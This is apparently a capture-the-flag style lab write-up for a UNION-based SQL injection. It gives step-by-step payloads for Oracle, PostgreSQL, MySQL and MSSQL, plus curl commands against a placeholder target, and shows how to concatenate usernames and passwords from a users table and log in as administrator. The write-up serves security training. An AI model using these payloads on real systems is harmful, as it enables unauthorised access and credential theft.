# SQL injection UNION attack, retrieving multiple values in a single column — Practitioner

**Status:** Solved

---

## Goal

When only one column can display text, retrieve multiple values by concatenating them together. Extract usernames and passwords from the 'users' table.

---

## Steps (simple & complete)

1. **Find the injection point**
   - Browse to the shopping application
   - Click on any product category:
```
   GET /filter?category=Gifts
```
   - This parameter is vulnerable to SQL injection

2. **Determine the number of columns**
   - Use ORDER BY or UNION SELECT NULL:
```
   Gifts' ORDER BY 1--
   Gifts' ORDER BY 2--
   Gifts' ORDER BY 3--
```
   - Let's say it has 2 columns

3. **Find which column accepts text**
   - Test each column:
```
   Gifts' UNION SELECT 'abc',NULL--
   Gifts' UNION SELECT NULL,'abc'--
```
   - Let's say only the second column displays text

4. **The problem**
   - We need to extract both username AND password
   - But only ONE column can display text
   - Solution: Concatenate both values into a single string

5. **Choose concatenation method based on database**
   
   **For Oracle:**
```
   Gifts' UNION SELECT NULL,username||'~'||password FROM users--
```
   
   **For PostgreSQL:**
```
   Gifts' UNION SELECT NULL,username||'~'||password FROM users--
```
   
   **For MySQL:**
```
   Gifts' UNION SELECT NULL,CONCAT(username,'~',password) FROM users--
```
   
   **For Microsoft SQL Server:**
```
   Gifts' UNION SELECT NULL,username+'~'+password FROM users--
```

6. **Try each syntax until one works**
   
   Try Oracle/PostgreSQL first:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"
```
   
   If that fails, try MySQL:
```bash
   curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,CONCAT(username,'~',password)+FROM+users--"
```

7. **Extract administrator credentials**
   - Look through the page output
   - You'll see concatenated values like: `administrator~p@ssw0rd123`
   - The `~` (or your chosen separator) divides username from password
   - Copy the administrator's password

8. **Log in as administrator**
   - Go to the login page
   - Username: `administrator`
   - Password: (the one you extracted)
   - Click "Log in"
   - Lab solves automatically

---

## Example

- Vulnerable endpoint: `GET /filter?category=Gifts`
- Column count: 2 columns
- Only column 2 accepts text
- Database: PostgreSQL

Payload:
```bash
curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--"
```

Output on page:
```
Product: Laptop - $999
administrator~s3cr3tP@ss
wiener~peter
carlos~montoya
Product: Keyboard - $50
```

Extract password: `s3cr3tP@ss` and log in!

---

## Concatenation syntax by database

| Database | Syntax | Example |
|----------|--------|---------|
| **Oracle** | `||` operator | `username||'~'||password` |
| **PostgreSQL** | `||` operator | `username||'~'||password` |
| **MySQL** | `CONCAT()` function | `CONCAT(username,'~',password)` |
| **MSSQL** | `+` operator | `username+'~'+password` |

**Choosing a separator:**
- Use a character unlikely to appear in data: `~`, `|`, `:`, `###`
- Avoid spaces (can cause issues)
- Avoid special SQL characters like `'`, `"`, `;`
- Makes parsing output easier

---

## Why this matters

**Real-world constraints:**
- Applications often display limited columns
- Not every column is visible on the page
- Sometimes only one text column is available
- Concatenation is essential for multi-value extraction

**The technique:**
- Combine multiple values into one string
- Use a delimiter to separate them
- Extract and parse the concatenated result
- Works around single-column limitations

**Advanced usage:**
- Can concatenate 3+ fields: `username||'~'||password||'~'||email`
- Can add labels: `'User:'||username||',Pass:'||password`
- Essential skill for blind and limited injection scenarios

---

## Common issues

- **Wrong syntax**: Try different concatenation methods for different databases
- **No separator**: Without delimiter, values blend together (hard to parse)
- **Wrong column**: Make sure you're using the text-compatible column
- **Encoding**: Some characters might need URL encoding in the payload

---

